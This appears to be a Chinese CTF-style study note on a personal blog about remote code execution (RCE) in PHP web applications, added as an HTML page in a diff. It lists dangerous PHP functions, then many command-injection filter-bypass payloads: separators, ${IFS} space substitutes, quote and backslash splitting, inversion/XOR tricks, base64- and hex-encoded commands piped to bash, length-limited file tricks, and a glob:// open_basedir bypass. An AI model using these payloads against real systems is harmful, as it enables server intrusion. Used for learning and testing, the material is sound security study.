@@ -1,0 +1,263 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>RCE | Wea5e1-BLOG</title><meta name="author" content="Wea5e1"><meta name="copyright" content="Wea5e1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="RCE: 1.简述： 在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时，就产生了RCE漏洞。 危害：可以让用户（通常是系统管理员或普通用户）执行任意系统命令的漏洞。这种漏洞通常存在于某些程序或脚本中，允许输入参数被编码并传递给可执行文件。  比如：如果应用系统从设计上需要给用户提供指定的远程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE">
+<meta property="og:url" content="http://example.com/2025/03/02/RCE/index.html">
+<meta property="og:site_name" content="Wea5e1-BLOG">
+<meta property="og:description" content="RCE: 1.简述： 在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时，就产生了RCE漏洞。 危害：可以让用户（通常是系统管理员或普通用户）执行任意系统命令的漏洞。这种漏洞通常存在于某些程序或脚本中，允许输入参数被编码并传递给可执行文件。  比如：如果应用系统从设计上需要给用户提供指定的远程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/favicons.png">
+<meta property="article:published_time" content="2025-03-02T06:42:07.000Z">
+<meta property="article:modified_time" content="2025-03-02T06:45:57.213Z">
+<meta property="article:author" content="Wea5e1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/favicons.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "RCE",
+  "url": "http://example.com/2025/03/02/RCE/",
+  "image": "http://example.com/img/favicons.png",
+  "datePublished": "2025-03-02T06:42:07.000Z",
+  "dateModified": "2025-03-02T06:45:57.213Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Wea5e1",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicons.png"><link rel="canonical" href="http://example.com/2025/03/02/RCE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'RCE',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicons.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: [object Object];"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Wea5e1-BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">RCE</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-02T06:42:07.000Z" title="发表于 2025-03-02 14:42:07">2025-03-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-02T06:45:57.213Z" title="更新于 2025-03-02 14:45:57">2025-03-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>RCE:</p>
+<p>1.简述：</p>
+<p>在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时，就产生了RCE漏洞。</p>
+<p>危害：可以让用户（通常是系统管理员或普通用户）执行任意系统命令的漏洞。这种漏洞通常存在于某些程序或脚本中，允许输入参数被编码并传递给可执行文件。</p>
+<p> 比如：如果应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p>
+<p>2.分类：命令执行和代码执行</p>
+<p>3.常见函数：</p>
+<p> (1)命令执行函数：</p>
+<p>system()：能将字符串作为OS命令执行，且返回命令执行结果；</p>
+<p>exec()：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；</p>
+<p>shell_exec()：能将字符串作为OS命令执行</p>
+<p>passthru()：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；</p>
+<p>popen()：打开进程文件指针</p>
+<p>proc_open()：与popen()类似</p>
+<p>pcntl_exec()：在当前进程空间执行指定程序；</p>
+<p>反引号<code>：反引号</code>内的字符串会被解析为OS命令；</p>
+<p>补充：OS命令执行是指将用户的文本命令通过操作系统转化为二进制指令并执行的过程</p>
+<p>(2)代码执行函数：</p>
+<p>eval()：将字符串作为php代码执行；</p>
+<p>assert()：将字符串作为php代码执行；</p>
+<p>preg_replace()：正则匹配替换字符串；</p>
+<p>create_function()：主要创建匿名函数；</p>
+<p>call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；</p>
+<p>call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</p>
+<p>可变函数：若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数执行；</p>
+<p>4.常见绕过：</p>
+<p>(1)管道符绕过：</p>
+<p>；：即；前后都执行</p>
+<p>&amp;：即&amp;前后都执行</p>
+<p>&amp;&amp;：即如果&amp;&amp;前为真才执行&amp;&amp;后面的，不然只执行&amp;&amp;前面的</p>
+<p>| ：即显示|后面的执行结果</p>
+<p>||：||前面为假时才执行||后面的，否则只执行||前面的</p>
+<p>(2)空格过滤：</p>
+<p>空格可以替换成：</p>
+<p>&lt;  &lt;&gt;  %20(即space) %09(即TAB)  $IFS$9  ${IFS}  $IFS  {}</p>
+<p>(3)反斜杠：</p>
+<p>如cat、ls被过滤，使用\绕过：<br>c\at &#x2F;flag<br>l\s &#x2F;</p>
+<p>(4)取反绕过：</p>
+<p>&#x2F;&#x2F;取反传参<br>&lt;?php</p>
+<p>$a &#x3D; “system”;<br>$b &#x3D; “cat &#x2F;flag”;</p>
+<p>$c &#x3D; urlencode(<del>$a);<br>$d &#x3D; urlencode(</del>$b);</p>
+<p>&#x2F;&#x2F;输出得到取反传参内容<br>echo “?cmd&#x3D;(<del>“.$c.”)(</del>“.$d.”);”<br>?&gt;</p>
+<p>(5)异或绕过:</p>
+<p>这里推荐yu师傅的脚本</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p>
+<p>(6)黑名单绕过：</p>
+<p>&#x2F;&#x2F;变量拼接，如flag被过滤<br>将：<br>cat &#x2F;flag<br>替换为：<br>b&#x3D;ag;cat &#x2F;fl$b</p>
+<p>&#x2F;&#x2F;读取根目录<br>eval(var_dump(scandir(‘&#x2F;‘););<br>&#x2F;&#x2F;读flag<br>eval(var_dump(file_get_contents($_POST[‘a’])););&amp;a&#x3D;&#x2F;flag</p>
+<p>&#x2F;&#x2F;等效于打开ls目录下的文件<br>cat <code>ls</code></p>
+<p>&#x2F;&#x2F;<em>被过滤，php8以下，变量名中的第一个非法字符[会被替换为下划线</em><br>N[S.S等效于N_S.S<br>php需要接收e_v.a.l参数,给e[v.a.l传参即可</p>
+<p>&#x2F;&#x2F;php标签绕过<br>?&gt;<?= phpinfo(); ?></p>
+<p>(7)base和hexo编码绕过：</p>
+<p>&#x2F;&#x2F;base64编码绕过,编码cat &#x2F;flag，反引号、| bash、$()用于执行系统命令<br><code>echo Y2F0IC9mbGFn | base64 -d</code><br>echo Y2F0IC9mbGFn | base64 -d | bash<br>$(echo Y2F0IC9mbGFn | base64 -d)</p>
+<p>&#x2F;&#x2F;hex编码绕过，编码cat &#x2F;flag,| bash用于执行系统命令<br>echo ‘636174202f666c6167’ | xxd -r -p | bash</p>
+<p>&#x2F;&#x2F;shellcode编码<br>&#x2F;&#x2F;十六进制编码</p>
+<p>(8)正则匹配绕过：</p>
+<p>&#x2F;&#x2F;如flag被过滤<br>cat &#x2F;f???<br>cat &#x2F;fl*<br>cat &#x2F;f[a-z]{3}</p>
+<p>cat &#x2F;?l*</p>
+<p>(9)引号绕过：</p>
+<p>&#x2F;&#x2F;如cat、ls被过滤*</p>
+<p>ca””t &#x2F;flag</p>
+<p>l’s’ &#x2F;</p>
+<p>(10)cat替换命令：</p>
+<p>tac	与cat相反，按行反向输出<br>more	按页显示，用于文件内容较多且不能滚动屏幕时查看文件<br>less	与more类似<br>tail	查看文件末几行<br>head	查看文件首几行<br>nl	在cat查看文件的基础上显示行号<br>od	以二进制方式读文件，od -A d -c &#x2F;flag转人可读字符<br>xxd	以二进制方式读文件，同时有可读字符显示<br>sort	排序文件<br>uniq	报告或删除文件的重复行<br>file -f	报错文件内容<br>grep	过滤查找字符串，grep flag &#x2F;flag</p>
+<p>strings(也是)</p>
+<p>(11)无回显绕过：</p>
+<p>&#x2F;&#x2F;无回显RCE，如exce()函数，可将执行结果输出到文件再访问文件执行以下命令后访问1.txt即可<br>ls &#x2F; | tee 1.txt<br>cat &#x2F;flag | tee 2.txt<br>&#x2F;&#x2F;eval()无输出<br>eval(print<code>c\at /flag</code>;)</p>
+<p>(12)</p>
+<p>无参数RCE</p>
+<p>​    利用getallheaders()、get_defined_vars()、session_id等；</p>
+<p>无字母数字RCE</p>
+<p>​    异或、取反、自增、临时文件上传；</p>
+<p>(14)取反绕过：</p>
+<p>&#x2F;&#x2F;取反传参<br>&lt;?php</p>
+<p>$a &#x3D; “system”;<br>$b &#x3D; “cat &#x2F;flag”;</p>
+<p>$c &#x3D; urlencode(<del>$a);<br>$d &#x3D; urlencode(</del>$b);</p>
+<p>&#x2F;&#x2F;输出得到取反传参内容<br>echo “?cmd&#x3D;(<del>“.$c.”)(</del>“.$d.”);”<br>?&gt;</p>
+<p>(15)长度限制：</p>
+<p>touch “ag”</p>
+<p>touch “fl\“</p>
+<p>touch “t \“</p>
+<p>touch “ca\“</p>
+<p>ls -t</p>
+<p>-&gt;ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</p>
+<p>ls -t &gt; shell</p>
+<p>sh shell(读取flag)</p>
+<p>空格\ ： 这个其实是换行。<br>ls -t ：按照时间将文本排序输出<br>ls -t &gt; shell：将ls -t的输出储存到shell文件中<br>我们首先是用touch命令创建了几个文件，但是他们的文件名是我们的主要。我们使用两个\的原因在于，第一个\用于将后面的\变成字符串，第二个\是用来将后面的文本转换为字符串，以便用于后面的测试。</p>
+<p>补充：</p>
+<p>关于有一些全是报错的；就比如使用var_export(scandir(“&#x2F;“));扫描根目录文件结果发现全是？！什么的；就是全给你替换了，我们可以结合 exit() 函数执行php代码让后面的匹配缓冲区不执行直接退出</p>
+<p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<p>使用 glob:&#x2F;&#x2F; 伪协议绕过 open_basedir，读取根目录下的文件，payload：</p>
+<p>c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob:///*");
+foreach($a as $f)
+{
+   echo($f->__toString().' ');
+}
+exit(0);
+?>或者c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}exit(0);</p>
+<p>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;getFilename().” “);} exit(0);</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Wea5e1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/02/RCE/">http://example.com/2025/03/02/RCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Wea5e1-BLOG</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/favicons.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/money.jpg" target="_blank"><img class="post-qr-code-img" src="/img/money.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/02/18/hello-world/" title="Hello World"><div class="cover" style="background: [object Object]"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new &quot;My New Post&quot;  More info: Writing Run server$ hexo server  More info: Server Generate static files$ hexo generate  More info: Generating Deploy to remote sites$ hexo deploy  More info: Deployment </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicons.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Wea5e1</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=3522700034&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3522700034@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/02/RCE/" title="RCE"><div style="background: [object Object]"></div></a><div class="content"><a class="title" href="/2025/03/02/RCE/" title="RCE">RCE</a><time datetime="2025-03-02T06:42:07.000Z" title="发表于 2025-03-02 14:42:07">2025-03-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/18/hello-world/" title="Hello World"><div style="background: [object Object]"></div></a><div class="content"><a class="title" href="/2025/02/18/hello-world/" title="Hello World">Hello World</a><time datetime="2025-02-18T14:16:08.570Z" title="发表于 2025-02-18 22:16:08">2025-02-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Wea5e1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.3</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
